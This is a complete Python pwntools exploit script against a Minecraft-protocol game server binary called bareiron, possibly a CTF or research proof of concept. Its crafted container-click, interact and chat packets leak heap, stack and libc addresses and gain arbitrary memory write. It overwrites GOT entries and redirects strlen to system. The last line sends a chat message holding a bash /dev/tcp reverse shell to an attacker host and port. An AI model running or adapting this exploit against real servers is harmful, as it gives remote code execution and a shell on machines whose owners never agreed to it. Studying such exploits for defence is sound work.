#!/usr/bin/env python3

from mcc import *
from pwn import *
import uuid

ATTACKER_HOST = "127.0.0.1" # localhost for testing
ATTACKER_PORT = 1337

PACKET_AUTH = 0x00
PACKET_ENTER = 0x03
PACKET_CHAT = 0x08
PACKET_CLICK_CONTAINER = 0x11
PACKET_INTERACT = 0x19
PACKET_PLAYER_ACTION = 0x28
PACKET_SET_HELD_ITEM = 0x34
PACKET_PLAYER_LOADED = 0x2B
PACKET_USE_ITEM_ON = 0x3F

INTERACTION_INTERACT = 0
INTERACTION_ATTACK = 1

STATE_NONE = 0
STATE_STATUS = 1
STATE_LOGIN = 2
STATE_TRANSFER = 3
STATE_CONFIGURATION = 4
STATE_PLAY = 5

exe = ELF("/home/vmpr0be/bareiron/bareiron")
libc = ELF("/usr/lib/libc.so.6")

def unpack_ptr(bytes):
    return u64(bytes.ljust(8, b"\0")[:8])

def short2ushort(value, endian="little"):
    if isinstance(value, bytes):
        try:
            from pwn import u16
            return u16(value, endian=endian)
        except Exception:
            s = int.from_bytes(value, byteorder=endian, signed=True)
            return s & 0xFFFF
    v = int(value)
    if not -32768 <= v <= 32767:
        raise ValueError("int out of signed 16-bit range")
    return v & 0xFFFF

def handshake(client: PacketClient, state):
    payload = client.write_varint(1337)
    payload += client.write_string("pwn")
    payload += client.write_ushort(25565) 
    payload += client.write_varint(state)
    client.send_packet(PACKET_AUTH, payload)

def chat(client: PacketClient, msg):
    payload = client.write_string(msg)
    payload += client.write_ulong(0)
    payload += client.write_ulong(0)
    payload += client.write_byte(0)
    payload += client.write_varint(0)
    payload += b"hell"
    client.send_packet(PACKET_CHAT, payload)

def login(client: PacketClient, name: str, _uuid: str):
    payload = client.write_string(name)
    payload += uuid.UUID(_uuid).bytes
    client.send_packet(PACKET_AUTH, payload)

def enter(client: PacketClient):
    # set to configuration state
    client.send_packet(PACKET_ENTER)
    
    # set to play state
    client.send_packet(PACKET_ENTER)
    client.send_packet(PACKET_PLAYER_LOADED)
    
def set_held_item(client: PacketClient, hotbar):
    payload = client.write_ushort(hotbar)
    client.send_packet(PACKET_SET_HELD_ITEM, payload)

def player_action(client: PacketClient, action, x, y, z, sequence):
    payload = client.write_byte(action)
    payload += client.write_ulong(pack_pos(x, y, z))
    payload += client.write_byte(0)
    payload += client.write_varint(sequence)
    
    client.clean()
    client.send_packet(PACKET_PLAYER_ACTION, payload)
    
    resp1_size = client._read_varint()
    resp1_data = client._read_bytes(resp1_size)

    resp2_size = client._read_varint()
    resp2_data = client._read_bytes(resp2_size)

    (_, next) = client.read_varint(resp2_data, 1)
    (_, next) = client.read_varint(resp2_data, next)
    (count, next) = client.read_varint(resp2_data, next + 2)

    item = 0
    if count > 0:
        item = client.read_varint(resp2_data, next)[0]

    return count, item

def click_container(client: PacketClient, window_id, clicked_slot, button, mode, has_item, slot, item, count, assign_cursor):
    payload = client.write_varint(window_id)
    payload += client.write_varint(0)
    payload += client.write_ushort(clicked_slot)
    payload += client.write_byte(button)
    payload += client.write_varint(mode)
    payload += client.write_varint(1)

    payload += client.write_ushort(slot)
    payload += client.write_byte(has_item)
    payload += client.write_varint(item)
    payload += client.write_varint(count)

    payload += client.write_varint(0)
    payload += client.write_varint(0)

    payload += client.write_byte(assign_cursor)
    
    client.send_packet(PACKET_CLICK_CONTAINER, payload)

def pack_pos(x, y, z):
    return ((x & 0x3FFFFFF) << 38) | ((z & 0x3FFFFFF) << 12) | (y & 0xFFF)

def use_item_on(client: PacketClient, x, y, z, face, sequence):
    payload = client.write_byte(0)
    payload += client.write_ulong(pack_pos(x, y, z))
    payload += client.write_byte(face)
    
    payload += client.write_uint(0)
    payload += client.write_uint(0)
    payload += client.write_uint(0)

    payload += client.write_byte(0)
    payload += client.write_byte(0)

    payload += client.write_varint(sequence)

    client.send_packet(PACKET_USE_ITEM_ON, payload)

log.info("loading main client")
client = PacketClient("127.0.0.1", 25565)

handshake(client, STATE_LOGIN)
login(client, "pwn", "00000000-0000-0000-0000-000000000000")
enter(client)
log.info("loaded client")

def set_storage_addr(client, addr):
    c0 = addr & 0xffff
    c1 = (addr >> 16) & 0xffff
    c2 = (addr >> 32) & 0xffff
    c3 = (addr >> 48) & 0xffff

    click_container(client, 12, 0, 0, 1, 1, 1, c0, 1, 0)
    click_container(client, 12, 0, 0, 1, 1, 2, c1, 1, 0)
    click_container(client, 12, 0, 0, 1, 1, 3, c2, 1, 0)
    click_container(client, 12, 0, 0, 1, 1, 4, c3, 1, 0)

def arb_write(client: PacketClient, addr, data: bytes):
    if len(data) % 2 != 0:
        data += b'\x00'
    
    for offset in range(0, len(data), 2):
        curr = addr + offset

        set_storage_addr(client, curr)

        if offset + 1 < len(data):
            v = (data[offset + 1] << 8) | data[offset]
        else:
            v = data[offset]

        click_container(client, 2, 0, 0, 1, 1, 0, v, 1, 0)

def arb_write3(client: PacketClient, addr, data: bytes):
    if data[2] == 0:
        log.error("3rd byte cannot be zero!")

    set_storage_addr(client, addr)
    click_container(client, 2, 0, 0, 1, 1, 0, u16(data[:2]), data[2], 0)

def leak_storage_ptr(client: PacketClient):
    # Set the 4 counts of inventory to non zero
    log.info("preparing inventory")
    for i in range(1, 5):
        click_container(client, 12, 0, 0, 1, 1, i, 0, 1, 0)

    # Put the storage_ptr into craft_items
    log.info("forcing storage pointer")
    use_item_on(client, 0, 67, 0, 0, 0)
    
    # Extract storage_ptr from craft_items
    bytes = b""
    for i in range(41, 45):
        set_held_item(client, i)
        (_, item) = player_action(client, 4, 0, 0, 0, 0)
        leaked_bytes = p16(item & 0xffff)
        log.info(f"leaked {leaked_bytes}")
        bytes += leaked_bytes

    return unpack_ptr(bytes)

storage_ptr = leak_storage_ptr(client)
log.info(f"leaked storage pointer: {hex(storage_ptr)}")

# round down to 0x1000 since we don't know the offset of the chest in block_changes
exe.address = (storage_ptr - exe.sym["block_changes"]) & ~0xfff
log.info(f"computed exe: {hex(exe.address)}")

def leak_stack(client: PacketClient):
    got_close = exe.got["close"]
    ld_close = exe.address + 0x1156
    write_uint64 = exe.sym["writeUint64"]
    log.info(f"got_close got!close: {hex(got_close)}")
    log.info(f"computed ld_close: {hex(ld_close)}")
    log.info(f"resolved write_uint64: {hex(write_uint64)}")

    log.info("loading new leaker client")
    leaker_cl = PacketClient("127.0.0.1", 25565)

    handshake(leaker_cl, STATE_LOGIN)
    login(leaker_cl, "leaker1", "00000000-0000-0000-0000-000000000001")

    arb_write(client, got_close, p64(write_uint64))
    log.info(f"overwrote got!close => write_uint64")

    log.info(f"triggering execution")
    leaker_cl.remote.clean()
    leaker_cl.remote.send(leaker_cl.write_varint(0xFFFFFFFF))

    # restore close pointer
    arb_write(client, got_close, p64(ld_close))
    log.info(f"fixing got!close")

    stack_leak = u64(leaker_cl._read_bytes(8), endianness="big")
    log.info(f"leaked stack address: {hex(stack_leak)}")

    stack_base = (stack_leak & ~0xfff) - 0x1d000

    log.info("closing leaker client")
    leaker_cl.close()

    return stack_base

def leak_libc(client: PacketClient):

    got_fread = exe.got["fread"]
    got_strncmp = exe.got["strncmp"]
    ld_strncmp = exe.address + 0x1086
  
    mob_data = exe.sym["mob_data"]
    player_data = exe.sym["player_data"]
    
    log.info(f"resolved got_fread: {hex(got_fread)}")
    log.info(f"resolved got_strncmp: {hex(got_strncmp)}")
    log.info(f"computed ld_strncmp: {hex(ld_strncmp)}")
    log.info(f"resolved mob_data: {hex(mob_data)}")
    log.info(f"resolved player_data: {hex(player_data)}")

    # Give shear to every player
    log.info("giving players shears")
    for i in range(0, 16):
        player_addr = player_data + i * 0xdd
        hotbar_addr = player_addr + 0x42
        inv_addr = player_addr + 0x43
        count_addr = player_addr + 0xA7

        arb_write(client, hotbar_addr, p8(0)) # hotbar
        arb_write(client, inv_addr, p16(1060)) # item 
        arb_write(client, count_addr, p8(1)) # count
        log.info(f"gave player {i} shear")

    def corrupt_read5(client: PacketClient, target):    
        distance = target - mob_data
        log.info(f"distance to read target: {hex(distance)}")
        if distance % 7 != 0:
            log.error(f"target must be 7 bytes aligned (rem: {distance % 7})")

        arb_write3(client, target - 2, p16(0) + p8(106)) # type to sheep
        arb_write(client, target + 6, p8(0)) # data disable bit

        entity_id = -(distance // 7 + 2)
        log.info(f"computed entity id: {entity_id}")
        
        payload = client.write_varint(entity_id)
        payload += client.write_byte(INTERACTION_INTERACT)

        payload += client.write_byte(0)
        payload += client.write_byte(0)

        client.clean()
        client.send_packet(PACKET_INTERACT, payload)

        resp_size = client._read_varint()
        resp_data = client._read_bytes(resp_size)

        (_, next) = client.read_byte(resp_data)
        (_, next) = client.read_varint(resp_data, next)
        (_, next) = client.read_uuid(resp_data, next)
        (_, next) = client.read_varint(resp_data, next)

        (x, next) = client.read_double(resp_data, next)
        (y, next) = client.read_double(resp_data, next)
        (z, next) = client.read_double(resp_data, next)

        low = p16(short2ushort(int(x - 0.5)))
        mid = p8(int(y - 0.5))
        high = p16(short2ushort(int(z - 0.5)))

        return low + mid + high

    # trigger strncmp usage so it gets loaded
    log.info("forcing strncmp load...")
    chat(client, "!help")
    sleep(0.5)

    leak1 = corrupt_read5(client, got_strncmp)
    log.info(f"leaked {leak1} from strncmp")

    # restore strncmp
    arb_write(client, got_strncmp, p64(ld_strncmp))
    log.info(f"fixed got!strncmp")

    leak2 = corrupt_read5(client, got_fread + 4)
    log.info(f"leaked {leak2} from fread")

    libc_leak = unpack_ptr(p8(0) + leak1[:4] + leak2[:2])
    log.info(f"leaked libc address: {hex(libc_leak)}")

    # 0x170000: strncmp offset on my system
    libc_base = (libc_leak & ~0xfff) - 0x170000

    return libc_base

# stack_base = leak_stack(client) 
# log.info(f"leaked stack: {hex(stack_base)}")

libc.address = leak_libc(client) 
log.info(f"leaked libc: {hex(libc.address)}")

# Redirect strlen to system
log.info("spawning reverse shell")
chat(client, "pwning server!")
sleep(1)
arb_write(client, exe.got["strlen"], p64(libc.sym["system"]))

# strlen is used with the chat message as strlen, now we spawn reverse shell
client.remote.clean()
chat(client, f"/bin/sh -i >& /dev/tcp/{ATTACKER_HOST}/{ATTACKER_PORT} 0>&1")

client.close()
